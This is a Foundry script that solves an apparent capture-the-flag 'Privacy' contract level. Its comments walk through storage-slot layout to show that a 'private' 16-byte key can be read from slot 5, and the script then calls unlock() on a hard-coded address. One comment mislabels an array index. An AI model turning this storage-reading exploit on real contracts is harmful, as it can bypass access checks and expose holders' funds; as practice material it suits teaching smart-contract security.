//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Privacy.sol";

contract PrivacyAttacker is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        /**
         * The privacy contract has an unlock method which takes a 16 byte key, this key needs to be equal to the first 16 bytes of the information stored in data.
         * state variables can always be read, so we can access the slot where the 3 entry of the data array is.
         * Booleans take up 1 byte -> slot 0
         * uint256 takes 32 bytes -> slot 1
         * uint8 takes up 1 byte   \
         * uint8 takes up 1 byte     ---> slot 2
         * uint16 takes up 2 bytes /
         * and then our array starts in a new slot with a length of 3
         * index 0 -> slot 3
         * index 1 -> slot 4
         * index 3 -> 5
         *
         * We can use foundry's cast storage command to access slot 5, slice the first 16bytes of the data and then use this as the key!
         */
        Privacy privacyContract = Privacy(
            0x6de372F8d90F05ea98f0fBa48b10C4DE4ed754d2
        );
        privacyContract.unlock(0x930a431f0d7603e691546f183f76a238);
        vm.stopBroadcast();
    }
}
